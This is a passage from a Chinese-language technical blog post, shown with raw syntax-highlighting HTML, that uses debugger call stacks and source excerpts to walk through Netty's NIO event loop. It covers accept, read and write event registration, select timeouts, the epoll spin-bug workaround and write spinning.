class="hljs-number">1360</span>io.netty.channel.DefaultChannelPipeline$HeadContext(io.netty.channel.AbstractChannelHandlerContext).invokeRead() line: <span class="hljs-number">693</span>io.netty.channel.DefaultChannelPipeline$TailContext(io.netty.channel.AbstractChannelHandlerContext).read() line: <span class="hljs-number">673</span>io.netty.channel.DefaultChannelPipeline.read() line: <span class="hljs-number">1015</span>io.netty.channel.socket.nio.NioServerSocketChannel(io.netty.channel.AbstractChannel).read() line: <span class="hljs-number">288</span>io.netty.channel.DefaultChannelPipeline$HeadContext.readIfIsAutoRead() line: <span class="hljs-number">1420</span>io.netty.channel.DefaultChannelPipeline$HeadContext.channelActive(io.netty.channel.ChannelHandlerContext) line: <span class="hljs-number">1398</span>io.netty.channel.DefaultChannelPipeline$HeadContext(io.netty.channel.AbstractChannelHandlerContext).invokeChannelActive() line: <span class="hljs-number">213</span>io.netty.channel.AbstractChannelHandlerContext.invokeChannelActive(io.netty.channel.AbstractChannelHandlerContext) line: <span class="hljs-number">199</span>io.netty.channel.DefaultChannelPipeline.fireChannelActive() line: <span class="hljs-number">906</span>io.netty.channel.AbstractChannel$AbstractUnsafe$<span class="hljs-number">2</span>.run() line: <span class="hljs-number">573</span>io.netty.util.concurrent.AbstractEventExecutor.safeExecute(java.lang.Runnable) line: <span class="hljs-number">163</span>io.netty.channel.nio.NioEventLoop(io.netty.util.concurrent.SingleThreadEventExecutor).runAllTasks(<span class="hljs-keyword">long</span>) line: <span class="hljs-number">404</span>io.netty.channel.nio.NioEventLoop.run() line: <span class="hljs-number">495</span>io.netty.util.concurrent.SingleThreadEventExecutor$<span class="hljs-number">5</span>.run() line: <span class="hljs-number">905</span>java.lang.Thread.run() line: <span class="hljs-number">748</span></code></pre><p>代码：  </p><pre><code class="hljs java"><span class="hljs-comment">// io.netty.channel.nio.AbstractNioChannel.doBeginRead()</span><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doBeginRead</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;    <span class="hljs-comment">// Channel.read() or ChannelHandlerContext.read() was called</span>    <span class="hljs-keyword">final</span> SelectionKey selectionKey = <span class="hljs-keyword">this</span>.selectionKey;    <span class="hljs-keyword">if</span> (!selectionKey.isValid()) &#123;        <span class="hljs-keyword">return</span>;    &#125;    readPending = <span class="hljs-keyword">true</span>;    <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> interestOps = selectionKey.interestOps();    <span class="hljs-keyword">if</span> ((interestOps &amp; readInterestOp) == <span class="hljs-number">0</span>) &#123;        selectionKey.interestOps(interestOps | readInterestOp); <span class="hljs-comment">// accept的readInterestOp是16</span>    &#125;&#125;</code></pre><h2 id="select出OP-ACCEPT的处理与SocketChannel的创建"><a href="#select出OP-ACCEPT的处理与SocketChannel的创建" class="headerlink" title="select出OP_ACCEPT的处理与SocketChannel的创建"></a>select出OP_ACCEPT的处理与SocketChannel的创建</h2><p>也就是在run方法中select的逻辑：<br>在策略判断时如果<strong>有任务</strong>的情况下会做io.netty.channel.nio.NioEventLoop.selectNowSupplier的get方法调用，这个方法中会selectNow：<br>在策略判断时如果<strong>没有任务</strong>的话，策略判断则会返回-1即SelectStrategy.SELECT，并执行带超时时间参数的select：  </p><pre><code class="hljs java"><span class="hljs-keyword">case</span> SelectStrategy.SELECT:                       select(wakenUp.getAndSet(<span class="hljs-keyword">false</span>));</code></pre><p>此时会走下面的调用栈：  </p><pre><code class="hljs java">SelectedSelectionKeySetSelector.select(<span class="hljs-keyword">long</span>) line: <span class="hljs-number">62</span>NioEventLoop.select(<span class="hljs-keyword">boolean</span>) line: <span class="hljs-number">786</span>NioEventLoop.run() line: <span class="hljs-number">434</span>SingleThreadEventExecutor$<span class="hljs-number">5</span>.run() line: <span class="hljs-number">905</span>Thread.run() line: <span class="hljs-number">748</span></code></pre><p>关于io.netty.channel.SelectStrategy.calculateStrategy(IntSupplier, boolean)策略的返回值整理情况如下：<br>① -2，跳过本次处理；目前还未构造出这种场景。<br>② -3，忙等也是跳过；目前还未构造出这种场景。<br>③ -1，没有任务时需要select，并判断是否要wakeup；没有任务时就是这种这种场景。<br>④ &gt;=0的其他值，也就是default，啥都不干往下走，走处理selectkey(即IO事件)或者所有任务(业务逻辑等)。<br>io.netty.channel.DefaultSelectStrategy.calculateStrategy(IntSupplier, boolean)  计算逻辑分析：<br>如果没有任务了 就返回 SelectStrategy.SELECT<br>如果有任务  就io.netty.channel.nio.NioEventLoop.new IntSupplier() {…}.() selectNow一次，注意这个<code>selectNow</code>是NioEventLoop的selectNow方法，但是最终还会对应到JDK的Selector的selectNow上去。   </p><h3 id="io-netty-channel-nio-NioEventLoop-select-boolean-分析"><a href="#io-netty-channel-nio-NioEventLoop-select-boolean-分析" class="headerlink" title="io.netty.channel.nio.NioEventLoop.select(boolean)分析"></a>io.netty.channel.nio.NioEventLoop.select(boolean)分析</h3><ol><li><p>select时超时时间怎么定<br>这个有超时时间的select，超时时间这个值是怎么确定的？<br>deadline减去当前时间(这两个都是用纳秒计量)后四舍五入到毫秒粒度<br>deadline又是怎么计算的？<br>默认值是1s，如果scheduledTaskQueue中有调度任务，以优先级队列顶部的scheduledTask的调度时间结合当前时间算出deadline。  </p></li><li><p>该select(boolean)的逻辑和避免epoll select空转bug的规避<br>整体是一个spin循环包起来的逻辑<br>如果deadline已到，则selector.selectNow();并退出spin循环。<br>如果有任务且wakeup是false(是false要将其设置成true)，则selector.selectNow();并退出spin循环。<br>上面两种情况都没命中则selector.select(timeoutMillis);并计数。如果selected到key了或者oldWakenUp为true或者wakenUp字段为true或者有任务或者有调度任务都退出spin循环。<br>如果在这个spin循环中seletc次数大于SELECTOR_AUTO_REBUILD_THRESHOLD（默认值512），则重建这个方法内局部变量Selector实例，并将之前selector上的事件注册到这个新的上面来。这个处理就是为了规避linux上epoll的bug，epoll可能select方法会直接返回，即使没有超时并且也没有IO事件到达，这就是著名的epoll bug，这是一个比较严重的bug，它会导致线程陷入死循环，会让CPU飙到100%。<a href="https://www.cnblogs.com/devilwind/p/8351732.html" target="_blank" rel="noopener">参见这里</a><br>相关代码：  </p><pre><code class="hljs java">io.netty.channel.nio.NioEventLoop.rebuildSelector0()SelectionKey newKey = key.channel().register(newSelectorTuple.unwrappedSelector, interestOps, a);</code></pre></li></ol><h3 id="Selector到key之后的处理"><a href="#Selector到key之后的处理" class="headerlink" title="Selector到key之后的处理"></a>Selector到key之后的处理</h3><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> ioRatio = <span class="hljs-keyword">this</span>.ioRatio;<span class="hljs-keyword">if</span> (ioRatio == <span class="hljs-number">100</span>) &#123;    <span class="hljs-keyword">try</span> &#123;        processSelectedKeys();    &#125; <span class="hljs-keyword">finally</span> &#123;        <span class="hljs-comment">// Ensure we always run tasks.</span>        runAllTasks();    &#125;&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> ioStartTime = System.nanoTime();    <span class="hljs-keyword">try</span> &#123;        processSelectedKeys();    &#125; <span class="hljs-keyword">finally</span> &#123;        <span class="hljs-comment">// Ensure we always run tasks.</span>        <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> ioTime = System.nanoTime() - ioStartTime;        runAllTasks(ioTime * (<span class="hljs-number">100</span> - ioRatio) / ioRatio);    &#125;&#125;</code></pre><h3 id="processSelectedKeys"><a href="#processSelectedKeys" class="headerlink" title="processSelectedKeys"></a>processSelectedKeys</h3><p>调用栈 ：  </p><pre><code class="hljs java">NioServerSocketChannel.doReadMessages(List&lt;Object&gt;) line: <span class="hljs-number">143</span>AbstractNioMessageChannel$NioMessageUnsafe.read() line: <span class="hljs-number">75</span>NioEventLoop.processSelectedKey(SelectionKey, AbstractNioChannel) line: <span class="hljs-number">677</span>NioEventLoop.processSelectedKeysOptimized() line: <span class="hljs-number">612</span>NioEventLoop.processSelectedKeys() line: <span class="hljs-number">529</span>NioEventLoop.run() line: <span class="hljs-number">491</span>SingleThreadEventExecutor$<span class="hljs-number">5</span>.run() line: <span class="hljs-number">905</span>Thread.run() line: <span class="hljs-number">748</span></code></pre><p>涉及的部分代码：<br>有accept出SocketChannel的关键部分  </p><pre><code class="hljs java"><span class="hljs-comment">// NioEventLoop</span><span class="hljs-keyword">if</span> ((readyOps &amp; (SelectionKey.OP_READ | SelectionKey.OP_ACCEPT)) != <span class="hljs-number">0</span> || readyOps == <span class="hljs-number">0</span>) &#123;    unsafe.read(); <span class="hljs-comment">// unsafe是io.netty.channel.nio.AbstractNioMessageChannel$NioMessageUnsafe</span>&#125;<span class="hljs-comment">//  NioServerSocketChannel</span><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-title">doReadMessages</span><span class="hljs-params">(List&lt;Object&gt; buf)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;    SocketChannel ch = SocketUtils.accept(javaChannel());    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-keyword">if</span> (ch != <span class="hljs-keyword">null</span>) &#123;            buf.add(<span class="hljs-keyword">new</span> NioSocketChannel(<span class="hljs-keyword">this</span>, ch));            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;        &#125;    &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;        logger.warn(<span class="hljs-string">"Failed to create a new channel from an accepted socket."</span>, t);        <span class="hljs-keyword">try</span> &#123;            ch.close();        &#125; <span class="hljs-keyword">catch</span> (Throwable t2) &#123;            logger.warn(<span class="hljs-string">"Failed to close a socket."</span>, t2);        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="注册OP-READ事件"><a href="#注册OP-READ事件" class="headerlink" title="注册OP_READ事件"></a>注册OP_READ事件</h2><p>woker调用栈：<br>注册出key：</p><pre><code class="hljs java">Thread [worker-<span class="hljs-number">0</span>] (Suspended (breakpoint at line <span class="hljs-number">386</span> in io.netty.channel.nio.AbstractNioChannel))io.netty.channel.socket.nio.NioSocketChannel(io.netty.channel.nio.AbstractNioChannel).doRegister() line: <span class="hljs-number">386</span>io.netty.channel.socket.nio.NioSocketChannel$NioSocketChannelUnsafe(io.netty.channel.AbstractChannel$AbstractUnsafe).register0(io.netty.channel.ChannelPromise) line: <span class="hljs-number">508</span>io.netty.channel.AbstractChannel$AbstractUnsafe.access$<span class="hljs-number">200</span>(io.netty.channel.AbstractChannel$AbstractUnsafe, io.netty.channel.ChannelPromise) line: <span class="hljs-number">427</span>io.netty.channel.AbstractChannel$AbstractUnsafe$<span class="hljs-number">1</span>.run() line: <span class="hljs-number">486</span>io.netty.util.concurrent.AbstractEventExecutor.safeExecute(java.lang.Runnable) line: <span class="hljs-number">163</span>io.netty.channel.nio.NioEventLoop(io.netty.util.concurrent.SingleThreadEventExecutor).runAllTasks(<span class="hljs-keyword">long</span>) line: <span class="hljs-number">404</span>io.netty.channel.nio.NioEventLoop.run() line: <span class="hljs-number">495</span>io.netty.util.concurrent.SingleThreadEventExecutor$<span class="hljs-number">5</span>.run() line: <span class="hljs-number">905</span>java.lang.Thread.run() line: <span class="hljs-number">748</span></code></pre><p>真正注册：  </p><pre><code class="hljs java">Thread [worker-<span class="hljs-number">0</span>] (Suspended (breakpoint at line <span class="hljs-number">420</span> in io.netty.channel.nio.AbstractNioChannel))io.netty.channel.socket.nio.NioSocketChannel(io.netty.channel.nio.AbstractNioChannel).doBeginRead() line: <span class="hljs-number">420</span>io.netty.channel.socket.nio.NioSocketChannel$NioSocketChannelUnsafe(io.netty.channel.AbstractChannel$AbstractUnsafe).beginRead() line: <span class="hljs-number">851</span>io.netty.channel.DefaultChannelPipeline$HeadContext.read(io.netty.channel.ChannelHandlerContext) line: <span class="hljs-number">1360</span>io.netty.channel.DefaultChannelPipeline$HeadContext(io.netty.channel.AbstractChannelHandlerContext).invokeRead() line: <span class="hljs-number">693</span>io.netty.channel.DefaultChannelHandlerContext(io.netty.channel.AbstractChannelHandlerContext).read() line: <span class="hljs-number">673</span>io.netty.handler.timeout.ReadTimeoutHandler(io.netty.channel.ChannelDuplexHandler).read(io.netty.channel.ChannelHandlerContext) line: <span class="hljs-number">95</span>io.netty.channel.DefaultChannelHandlerContext(io.netty.channel.AbstractChannelHandlerContext).invokeRead() line: <span class="hljs-number">693</span>io.netty.channel.DefaultChannelHandlerContext(io.netty.channel.AbstractChannelHandlerContext).read() line: <span class="hljs-number">673</span>io.netty.handler.codec.http.HttpResponseEncoder(io.netty.channel.ChannelOutboundHandlerAdapter).read(io.netty.channel.ChannelHandlerContext) line: <span class="hljs-number">93</span>io.netty.channel.DefaultChannelHandlerContext(io.netty.channel.AbstractChannelHandlerContext).invokeRead() line: <span class="hljs-number">693</span>io.netty.channel.DefaultChannelHandlerContext(io.netty.channel.AbstractChannelHandlerContext).read() line: <span class="hljs-number">673</span>io.netty.handler.stream.ChunkedWriteHandler(io.netty.channel.ChannelDuplexHandler).read(io.netty.channel.ChannelHandlerContext) line: <span class="hljs-number">95</span>io.netty.channel.DefaultChannelHandlerContext(io.netty.channel.AbstractChannelHandlerContext).invokeRead() line: <span class="hljs-number">693</span>io.netty.channel.DefaultChannelHandlerContext(io.netty.channel.AbstractChannelHandlerContext).read() line: <span class="hljs-number">673</span>io.netty.handler.codec.http.HttpContentCompressor(io.netty.channel.ChannelDuplexHandler).read(io.netty.channel.ChannelHandlerContext) line: <span class="hljs-number">95</span>io.netty.channel.DefaultChannelHandlerContext(io.netty.channel.AbstractChannelHandlerContext).invokeRead() line: <span class="hljs-number">693</span>io.netty.channel.DefaultChannelPipeline$TailContext(io.netty.channel.AbstractChannelHandlerContext).read() line: <span class="hljs-number">673</span>io.netty.channel.DefaultChannelPipeline.read() line: <span class="hljs-number">1015</span>io.netty.channel.socket.nio.NioSocketChannel(io.netty.channel.AbstractChannel).read() line: <span class="hljs-number">288</span>io.netty.channel.DefaultChannelPipeline$HeadContext.readIfIsAutoRead() line: <span class="hljs-number">1420</span>io.netty.channel.DefaultChannelPipeline$HeadContext.channelActive(io.netty.channel.ChannelHandlerContext) line: <span class="hljs-number">1398</span>io.netty.channel.DefaultChannelPipeline$HeadContext(io.netty.channel.AbstractChannelHandlerContext).invokeChannelActive() line: <span class="hljs-number">213</span>io.netty.channel.AbstractChannelHandlerContext.invokeChannelActive(io.netty.channel.AbstractChannelHandlerContext) line: <span class="hljs-number">199</span>io.netty.channel.DefaultChannelPipeline.fireChannelActive() line: <span class="hljs-number">906</span>io.netty.channel.socket.nio.NioSocketChannel$NioSocketChannelUnsafe(io.netty.channel.AbstractChannel$AbstractUnsafe).register0(io.netty.channel.ChannelPromise) line: <span class="hljs-number">522</span>io.netty.channel.AbstractChannel$AbstractUnsafe.access$<span class="hljs-number">200</span>(io.netty.channel.AbstractChannel$AbstractUnsafe, io.netty.channel.ChannelPromise) line: <span class="hljs-number">427</span>io.netty.channel.AbstractChannel$AbstractUnsafe$<span class="hljs-number">1</span>.run() line: <span class="hljs-number">486</span>io.netty.util.concurrent.AbstractEventExecutor.safeExecute(java.lang.Runnable) line: <span class="hljs-number">163</span>io.netty.channel.nio.NioEventLoop(io.netty.util.concurrent.SingleThreadEventExecutor).runAllTasks(<span class="hljs-keyword">long</span>) line: <span class="hljs-number">404</span>io.netty.channel.nio.NioEventLoop.run() line: <span class="hljs-number">495</span>io.netty.util.concurrent.SingleThreadEventExecutor$<span class="hljs-number">5</span>.run() line: <span class="hljs-number">905</span>java.lang.Thread.run() line: <span class="hljs-number">748</span></code></pre><h2 id="select出OP-READ的处理与buf的读取"><a href="#select出OP-READ的处理与buf的读取" class="headerlink" title="select出OP_READ的处理与buf的读取"></a>select出OP_READ的处理与buf的读取</h2><p>读取数据线程栈：  </p><pre><code class="hljs java">Thread [worker-<span class="hljs-number">2</span>] (Suspended (breakpoint at line <span class="hljs-number">57</span> in HttpContentDecoder))HttpContentDecompressor(HttpContentDecoder).decode(ChannelHandlerContext, HttpObject, List&lt;Object&gt;) line: <span class="hljs-number">57</span>HttpContentDecompressor(HttpContentDecoder).decode(ChannelHandlerContext, Object, List) line: <span class="hljs-number">47</span>HttpContentDecompressor(MessageToMessageDecoder&lt;I&gt;).channelRead(ChannelHandlerContext, Object) line: <span class="hljs-number">88</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeChannelRead(Object) line: <span class="hljs-number">362</span>AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext, Object) line: <span class="hljs-number">348</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).fireChannelRead(Object) line: <span class="hljs-number">340</span>ByteToMessageDecoder.fireChannelRead(ChannelHandlerContext, CodecOutputList, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">323</span>ByteToMessageDecoder.fireChannelRead(ChannelHandlerContext, List&lt;Object&gt;, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">310</span>HttpRequestDecoder(ByteToMessageDecoder).callDecode(ChannelHandlerContext, ByteBuf, List&lt;Object&gt;) line: <span class="hljs-number">426</span>HttpRequestDecoder(ByteToMessageDecoder).channelRead(ChannelHandlerContext, Object) line: <span class="hljs-number">278</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeChannelRead(Object) line: <span class="hljs-number">362</span>AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext, Object) line: <span class="hljs-number">348</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).fireChannelRead(Object) line: <span class="hljs-number">340</span>PipelineInitializer$ChannelActiveTester(ChannelInboundHandlerAdapter).channelRead(ChannelHandlerContext, Object) line: <span class="hljs-number">86</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeChannelRead(Object) line: <span class="hljs-number">362</span>AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext, Object) line: <span class="hljs-number">348</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).fireChannelRead(Object) line: <span class="hljs-number">340</span>ReadTimeoutHandler(IdleStateHandler).channelRead(ChannelHandlerContext, Object) line: <span class="hljs-number">286</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeChannelRead(Object) line: <span class="hljs-number">362</span>AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext, Object) line: <span class="hljs-number">348</span>DefaultChannelPipeline$HeadContext(AbstractChannelHandlerContext).fireChannelRead(Object) line: <span class="hljs-number">340</span>DefaultChannelPipeline$HeadContext.channelRead(ChannelHandlerContext, Object) line: <span class="hljs-number">1408</span>DefaultChannelPipeline$HeadContext(AbstractChannelHandlerContext).invokeChannelRead(Object) line: <span class="hljs-number">362</span>AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext, Object) line: <span class="hljs-number">348</span>DefaultChannelPipeline.fireChannelRead(Object) line: <span class="hljs-number">930</span>NioSocketChannel$NioSocketChannelUnsafe(AbstractNioByteChannel$NioByteUnsafe).read() line: <span class="hljs-number">163</span>NioEventLoop.processSelectedKey(SelectionKey, AbstractNioChannel) line: <span class="hljs-number">677</span>NioEventLoop.processSelectedKeysOptimized() line: <span class="hljs-number">612</span>NioEventLoop.processSelectedKeys() line: <span class="hljs-number">529</span>NioEventLoop.run() line: <span class="hljs-number">491</span>SingleThreadEventExecutor$<span class="hljs-number">5</span>.run() line: <span class="hljs-number">905</span>Thread.run() line: <span class="hljs-number">748</span></code></pre><p>在processSelectedKey之后会用 NioSocketChannelUnsafe将数据读到Buf中。再交给Pipeline触发后面的每一个handler。<br>此处要注意下读的时候 selectkey的attachment中放的是啥：  </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">processSelectedKeysOptimized</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; selectedKeys.size; ++i) &#123;        <span class="hljs-keyword">final</span> SelectionKey k = selectedKeys.keys[i];        <span class="hljs-comment">// null out entry in the array to allow to have it GC'ed once the Channel close</span>        <span class="hljs-comment">// See https://github.com/netty/netty/issues/2363</span>        selectedKeys.keys[i] = <span class="hljs-keyword">null</span>;        <span class="hljs-keyword">final</span> Object a = k.attachment(); <span class="hljs-comment">// 附件中放的是AbstractNioChannel  AbstractNioChannel中有unsafe对象，unsafe中能关联读取用的buf。</span>        <span class="hljs-keyword">if</span> (a <span class="hljs-keyword">instanceof</span> AbstractNioChannel) &#123;            processSelectedKey(k, (AbstractNioChannel) a);            <span class="hljs-comment">// ...</span>        &#125;        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">processSelectedKey</span><span class="hljs-params">(SelectionKey k, AbstractNioChannel ch)</span> </span>&#123;    <span class="hljs-keyword">final</span> AbstractNioChannel.NioUnsafe unsafe = ch.unsafe(); <span class="hljs-comment">// AbstractNioChannel中有unsafe对象</span>    <span class="hljs-comment">// ...</span>     <span class="hljs-keyword">if</span> ((readyOps &amp; (SelectionKey.OP_READ | SelectionKey.OP_ACCEPT)) != <span class="hljs-number">0</span> || readyOps == <span class="hljs-number">0</span>) &#123;            unsafe.read();        &#125;</code></pre><h2 id="写出数据的处理"><a href="#写出数据的处理" class="headerlink" title="写出数据的处理"></a>写出数据的处理</h2><p>写数据的处理可以在SocketChannelImpl [entry] - write(ByteBuffer)    处打方法断点观察。<br>调用堆栈如下：  </p><pre><code class="hljs java">Thread [worker-<span class="hljs-number">3</span>] (Suspended (entry into method write in SocketChannelImpl))SocketChannelImpl.write(ByteBuffer) line: <span class="hljs-number">458</span>NioSocketChannel.doWrite(ChannelOutboundBuffer) line: <span class="hljs-number">405</span>NioSocketChannel$NioSocketChannelUnsafe(AbstractChannel$AbstractUnsafe).flush0() line: <span class="hljs-number">938</span>NioSocketChannel$NioSocketChannelUnsafe(AbstractNioChannel$AbstractNioUnsafe).flush0() line: <span class="hljs-number">360</span>NioSocketChannel$NioSocketChannelUnsafe(AbstractChannel$AbstractUnsafe).flush() line: <span class="hljs-number">905</span>DefaultChannelPipeline$HeadContext.flush(ChannelHandlerContext) line: <span class="hljs-number">1370</span>DefaultChannelPipeline$HeadContext(AbstractChannelHandlerContext).invokeFlush0() line: <span class="hljs-number">776</span>DefaultChannelPipeline$HeadContext(AbstractChannelHandlerContext).invokeFlush() line: <span class="hljs-number">768</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).flush() line: <span class="hljs-number">749</span>ReadTimeoutHandler(ChannelDuplexHandler).flush(ChannelHandlerContext) line: <span class="hljs-number">117</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeFlush0() line: <span class="hljs-number">776</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeFlush() line: <span class="hljs-number">768</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).flush() line: <span class="hljs-number">749</span>HttpResponseEncoder(ChannelOutboundHandlerAdapter).flush(ChannelHandlerContext) line: <span class="hljs-number">115</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeFlush0() line: <span class="hljs-number">776</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeFlush() line: <span class="hljs-number">768</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).flush() line: <span class="hljs-number">749</span>ChunkedWriteHandler.doFlush(ChannelHandlerContext) line: <span class="hljs-number">335</span>ChunkedWriteHandler.channelWritabilityChanged(ChannelHandlerContext) line: <span class="hljs-number">148</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeChannelWritabilityChanged() line: <span class="hljs-number">434</span>AbstractChannelHandlerContext.invokeChannelWritabilityChanged(AbstractChannelHandlerContext) line: <span class="hljs-number">416</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).fireChannelWritabilityChanged() line: <span class="hljs-number">409</span>HttpContentDecompressor(ChannelInboundHandlerAdapter).channelWritabilityChanged(ChannelHandlerContext) line: <span class="hljs-number">119</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeChannelWritabilityChanged() line: <span class="hljs-number">434</span>AbstractChannelHandlerContext.invokeChannelWritabilityChanged(AbstractChannelHandlerContext) line: <span class="hljs-number">416</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).fireChannelWritabilityChanged() line: <span class="hljs-number">409</span>HttpRequestDecoder(ChannelInboundHandlerAdapter).channelWritabilityChanged(ChannelHandlerContext) line: <span class="hljs-number">119</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeChannelWritabilityChanged() line: <span class="hljs-number">434</span>AbstractChannelHandlerContext.invokeChannelWritabilityChanged(AbstractChannelHandlerContext) line: <span class="hljs-number">416</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).fireChannelWritabilityChanged() line: <span class="hljs-number">409</span>PipelineInitializer$ChannelActiveTester(ChannelInboundHandlerAdapter).channelWritabilityChanged(ChannelHandlerContext) line: <span class="hljs-number">119</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeChannelWritabilityChanged() line: <span class="hljs-number">434</span>AbstractChannelHandlerContext.invokeChannelWritabilityChanged(AbstractChannelHandlerContext) line: <span class="hljs-number">416</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).fireChannelWritabilityChanged() line: <span class="hljs-number">409</span>ReadTimeoutHandler(ChannelInboundHandlerAdapter).channelWritabilityChanged(ChannelHandlerContext) line: <span class="hljs-number">119</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeChannelWritabilityChanged() line: <span class="hljs-number">434</span>AbstractChannelHandlerContext.invokeChannelWritabilityChanged(AbstractChannelHandlerContext) line: <span class="hljs-number">416</span>DefaultChannelPipeline$HeadContext(AbstractChannelHandlerContext).fireChannelWritabilityChanged() line: <span class="hljs-number">409</span>DefaultChannelPipeline$HeadContext.channelWritabilityChanged(ChannelHandlerContext) line: <span class="hljs-number">1431</span>DefaultChannelPipeline$HeadContext(AbstractChannelHandlerContext).invokeChannelWritabilityChanged() line: <span class="hljs-number">434</span>AbstractChannelHandlerContext.invokeChannelWritabilityChanged(AbstractChannelHandlerContext) line: <span class="hljs-number">416</span>DefaultChannelPipeline.fireChannelWritabilityChanged() line: <span class="hljs-number">942</span>ChannelOutboundBuffer$<span class="hljs-number">2</span>.run() line: <span class="hljs-number">608</span>AbstractEventExecutor.safeExecute(Runnable) line: <span class="hljs-number">163</span>NioEventLoop(SingleThreadEventExecutor).runAllTasks(<span class="hljs-keyword">long</span>) line: <span class="hljs-number">404</span>NioEventLoop.run() line: <span class="hljs-number">495</span>SingleThreadEventExecutor$<span class="hljs-number">5</span>.run() line: <span class="hljs-number">905</span>Thread.run() line: <span class="hljs-number">748</span></code></pre><p>核心逻辑在：<br>io.netty.channel.socket.nio.NioSocketChannel.doWrite(ChannelOutboundBuffer)  </p><pre><code class="hljs java"> <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: &#123;    <span class="hljs-comment">// Only one ByteBuf so use non-gathering write</span>    <span class="hljs-comment">// Zero length buffers are not added to nioBuffers by ChannelOutboundBuffer, so there is no need</span>    <span class="hljs-comment">// to check if the total size of all the buffers is non-zero.</span>    ByteBuffer buffer = nioBuffers[<span class="hljs-number">0</span>];    <span class="hljs-keyword">int</span> attemptedBytes = buffer.remaining();    <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> localWrittenBytes = ch.write(buffer);    <span class="hljs-keyword">if</span> (localWrittenBytes &lt;= <span class="hljs-number">0</span>) &#123;        incompleteWrite(<span class="hljs-keyword">true</span>);        <span class="hljs-keyword">return</span>;    &#125;    adjustMaxBytesPerGatheringWrite(attemptedBytes, localWrittenBytes, maxBytesPerGatheringWrite);    in.removeBytes(localWrittenBytes);    --writeSpinCount;    <span class="hljs-keyword">break</span>;&#125;</code></pre><p><strong>writeSpinCount</strong>默认是16，也就说说写出线程会尝试写16次，如果ch.write写不出去了再调用incompleteWrite，incompleteWrite里会注册OP_WRITE事件，此处是个优化，不是一上来就注册事件，是先尝试写，写不了再注册。  </p><h2 id="注册OP-WRITE事件"><a href="#注册OP-WRITE事件" class="headerlink" title="注册OP_WRITE事件"></a>注册OP_WRITE事件</h2><p>需要构造较大的响应包，在本地才能观察到。 我构造了将近200万字符，才达能目的。<br>注册的地方打断点在 SelectionKeyImpl [entry] - interestOps(int)    遍可以观察<br>堆栈如下：  </p><pre><code class="hljs java">Thread [worker-<span class="hljs-number">3</span>] (Suspended (entry into method interestOps in SelectionKeyImpl))SelectionKeyImpl.interestOps(<span class="hljs-keyword">int</span>) line: <span class="hljs-number">82</span>NioSocketChannel(AbstractNioByteChannel).setOpWrite() line: <span class="hljs-number">332</span>NioSocketChannel(AbstractNioByteChannel).incompleteWrite(<span class="hljs-keyword">boolean</span>) line: <span class="hljs-number">289</span>NioSocketChannel.doWrite(ChannelOutboundBuffer) line: <span class="hljs-number">407</span>NioSocketChannel$NioSocketChannelUnsafe(AbstractChannel$AbstractUnsafe).flush0() line: <span class="hljs-number">938</span>NioSocketChannel$NioSocketChannelUnsafe(AbstractNioChannel$AbstractNioUnsafe).flush0() line: <span class="hljs-number">360</span>NioSocketChannel$NioSocketChannelUnsafe(AbstractChannel$AbstractUnsafe).flush() line: <span class="hljs-number">905</span>DefaultChannelPipeline$HeadContext.flush(ChannelHandlerContext) line: <span class="hljs-number">1370</span>DefaultChannelPipeline$HeadContext(AbstractChannelHandlerContext).invokeFlush0() line: <span class="hljs-number">776</span>DefaultChannelPipeline$HeadContext(AbstractChannelHandlerContext).invokeFlush() line: <span class="hljs-number">768</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).flush() line: <span 